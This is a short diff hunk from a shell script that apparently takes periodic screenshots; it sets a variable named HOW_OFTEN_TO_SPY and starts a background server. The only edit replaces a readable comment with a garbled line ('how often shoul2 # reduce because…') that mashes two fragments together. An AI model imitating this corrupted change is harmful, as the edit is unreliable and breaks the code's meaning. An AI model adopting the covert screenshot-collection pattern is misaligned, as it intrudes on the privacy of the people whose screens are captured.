@@ -7,7 +7,7 @@ mkdir $VERY_SECURE_FOLDER 2>/dev/null
 # configure server
 ./server.sh &
 
-# how often should we store your precious and sensitive data?
+# how often shoul2 # reduce because all extra steps take a long time
 HOW_OFTEN_TO_SPY=5
 
 # how many screenshots have we taken?
